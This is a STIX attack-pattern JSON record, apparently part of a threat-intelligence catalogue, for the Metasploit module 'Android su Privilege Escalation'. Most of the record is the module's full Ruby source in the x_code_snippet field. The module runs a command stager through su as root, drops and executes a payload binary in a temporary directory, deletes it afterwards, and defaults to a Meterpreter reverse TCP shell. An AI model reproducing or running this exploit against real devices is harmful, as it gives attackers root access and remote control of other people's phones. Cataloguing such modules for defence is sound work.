{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--30dd4566-f364-4284-9995-7b1449afdd2f",
    "created": "2024-08-14T16:35:11.624348Z",
    "modified": "2024-08-14T16:35:11.62436Z",
    "name": "\"Android su Privilege Escalation\"",
    "description": " This module uses the su binary present on rooted devices to run a payload as root.  A rooted Android device will contain a su binary (often linked with an application) that allows the user to run commands as root. This module will use the su binary to execute a command stager as root. The command stager will write a payload binary to a temporary directory, make it executable, execute it in the background and finally delete the executable.  On most devices the su binary will pop-up a prompt on the device asking the user for permission. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/android/local/su_exec.rb",
            "external_id": "su_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ManualRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Post::File\n  include Msf::Post::Android::Priv\n\n  def initialize(info={})\n    super( update_info( info, {\n      'Name'           => \"Android 'su' Privilege Escalation\",\n      'Description'    => %q{\n          This module uses the su binary present on rooted devices to run\n          a payload as root.\n\n          A rooted Android device will contain a su binary (often linked with\n          an application) that allows the user to run commands as root.\n          This module will use the su binary to execute a command stager\n          as root. The command stager will write a payload binary to a\n          temporary directory, make it executable, execute it in the background,\n          and finally delete the executable.\n\n          On most devices the su binary will pop-up a prompt on the device\n          asking the user for permission.\n      },\n      'Author'         => 'timwr',\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2017-08-31',\n      'SessionTypes'   => [ 'meterpreter', 'shell' ],\n      'Platform'       => [ 'android', 'linux' ],\n      'Arch'           => [ ARCH_AARCH64, ARCH_ARMLE, ARCH_X86, ARCH_X64, ARCH_MIPSLE ],\n      'Targets'        => [\n        ['aarch64',{'Arch' => ARCH_AARCH64}],\n        ['armle',  {'Arch' => ARCH_ARMLE}],\n        ['x86',    {'Arch' => ARCH_X86}],\n        ['x64',    {'Arch' => ARCH_X64}],\n        ['mipsle', {'Arch' => ARCH_MIPSLE}]\n      ],\n      'DefaultOptions' => {\n        'PAYLOAD' => 'linux/aarch64/meterpreter/reverse_tcp',\n        'WfsDelay' => 5,\n      },\n      'DefaultTarget'  => 0,\n      }\n    ))\n    register_options([\n      OptString.new('SU_BINARY', [true, 'The su binary to execute to obtain root', 'su']),\n      OptString.new('WritableDir', [true, 'Writable directory', '/data/local/tmp/']),\n    ])\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def su_bin\n    datastore['SU_BINARY'].to_s\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    linemax = 4088 - su_bin.size\n    execute_cmdstager({\n      flavor: :echo,\n      enc_format: :octal,\n      prefix: '\\\\\\\\0',\n      temp: base_dir,\n      linemax: linemax,\n      background: true,\n    })\n  end\n\n  def execute_command(cmd, opts)\n    su_cmd = \"#{su_bin} -c '#{cmd}'\"\n    cmd_exec(su_cmd)\n  end\n\nend\n\n",
    "x_mitre_disclosure_date": "2017-08-31",
    "x_mitre_platforms": [
        "[ 'android', 'linux' ]"
    ]
}